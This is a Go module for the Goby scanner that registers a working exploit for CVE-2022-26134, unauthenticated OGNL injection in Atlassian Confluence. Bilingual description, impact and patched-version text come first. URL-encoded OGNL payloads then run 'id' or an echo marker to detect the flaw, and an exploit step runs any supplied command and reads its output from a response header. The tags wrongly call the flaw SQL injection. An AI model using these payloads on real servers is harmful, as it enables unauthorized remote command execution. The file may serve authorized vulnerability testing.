package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Atlassian Confluence 远程代码执行漏洞（CVE-2022-26134）",
  "Description": "<p><span style=\"font-size: 14px;\">2022年6月3日，Atlassian Confluence官方发布公告称Confluence Server 和Data Center存在未授权远程代码执行漏洞，该漏洞由于Confluence将URL翻译成namespace，</span><span style=\"font-size: 14px;\">导致攻击者可以在URL路径中构造OGNL表达式，造成表达式注入，从而远程代码执行。</span><span style=\"font-size: 14px;\">该漏洞被分配编号：CVE-2022-26134。</span><br></p>",
  "Product": "Atlassian Confluence",
  "Homepage": "https://fofa.so/",
  "DisclosureDate": "2022-06-07",
  "Author": "",
  "FofaQuery": "product=\"Confluence\"",
  "GobyQuery": "product=\"Confluence\"",
  "Level": "3",
  "Impact": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">该漏洞由于Confluence将URL翻译成namespace，导致攻击者可以在URL路径中构造OGNL</span><a href=\"https://so.csdn.net/so/search?q=%E8%A1%A8%E8%BE%BE%E5%BC%8F&amp;spm=1001.2101.3001.7020\" target=\"_blank\">表达式</a><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">，造成表达式注入，从而远程代码执行。</span><br></p>",
  "Recommendation": "<p>官方已经发布新版本，建议企业用户高优排查暴露在外网的服务并进行修复，安全版本包括：7.4.17、7.13.7、7.14.3、7.15.2、7.16.4、7.17.4、7.18.1<br></p>",
  "References": [
    "https://github.com/Nwqda/CVE-2022-26134"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
        "follow_redirect": false,
        "header": {
          "Accept": "*/*"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "302",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$head",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo 46r5vewrvwerwevrwevrwevrwevrwevrw%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
        "follow_redirect": false,
        "header": {
          "Accept": "*/*"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "302",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$head",
            "operation": "contains",
            "value": "46r5vewrvwerwevrwevrwevrwevrwevrw",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{{{cmd}}}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
        "follow_redirect": false,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "302",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastheader|regex|X-Cmd-Response: (.*?)\\n"
      ]
    }
  ],
  "Tags": [
    "SQL 注⼊",
    "代码执⾏"
  ],
  "VulType": [
    "SQL 注⼊",
    "代码执⾏"
  ],
  "CVEIDs": [
    "CVE-2022-26134"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Atlassian Confluence 远程代码执行漏洞（CVE-2022-26134）",
      "Product": "Atlassian Confluence",
      "Description": "<p><span style=\"font-size: 14px;\">2022年6月3日，Atlassian Confluence官方发布公告称Confluence Server 和Data Center存在未授权远程代码执行漏洞，该漏洞由于Confluence将URL翻译成namespace，</span><span style=\"font-size: 14px;\">导致攻击者可以在URL路径中构造OGNL表达式，造成表达式注入，从而远程代码执行。</span><span style=\"font-size: 14px;\">该漏洞被分配编号：CVE-2022-26134。</span><br></p>",
      "Recommendation": "<p>官方已经发布新版本，建议企业用户高优排查暴露在外网的服务并进行修复，安全版本包括：7.4.17、7.13.7、7.14.3、7.15.2、7.16.4、7.17.4、7.18.1<br></p>",
      "Impact": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">该漏洞由于Confluence将URL翻译成namespace，导致攻击者可以在URL路径中构造OGNL</span><a href=\"https://so.csdn.net/so/search?q=%E8%A1%A8%E8%BE%BE%E5%BC%8F&amp;spm=1001.2101.3001.7020\" target=\"_blank\">表达式</a><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">，造成表达式注入，从而远程代码执行。</span><br></p>",
      "VulType": [
        "SQL 注⼊",
        "代码执⾏"
      ],
      "Tags": [
        "SQL 注⼊",
        "代码执⾏"
      ]
    },
    "EN": {
      "Name": "Atlassian Confluence Webwork OGNL Inject (CVE-2022-26134)",
      "Product": "",
      "Description": "<p><span style=\"font-size: 14px;\">Atlassian Confluence Server and Data Center have an unauthorized remote code execution vulnerability that translates urls to namespaces.</span><span style=\"font-size: 14px;\"> Causes an attacker to construct OGNL expressions in the URL path, causing expression injection, and thus remote code execution.</span><span style=\"font-size: 14px;\"> This vulnerability is assigned number: CVE-2022-26134.</span><br></p>",
      "Recommendation": "<p><span style=\"font-size: 14px;\"> </span><span style=\"font-size: 14px;\"> </span></p><p style=\"text-align: justify;\">A new version has been released. Enterprise users are advised to troubleshoot and repair exposed services on the Internet. Security versions include 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, and 7.18.1</p>",
      "Impact": "<p><span style=\"font-size: 14px;\">Because Confluence translates URL into namespace, attacker can construct OGNL expression in URL path, resulting in expression injection, thus remote code execution.</span><br></p>",
      "VulType": [
        "SQL Injection",
        "Code Execution"
      ],
      "Tags": [
        "SQL Injection",
        "Code Execution"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}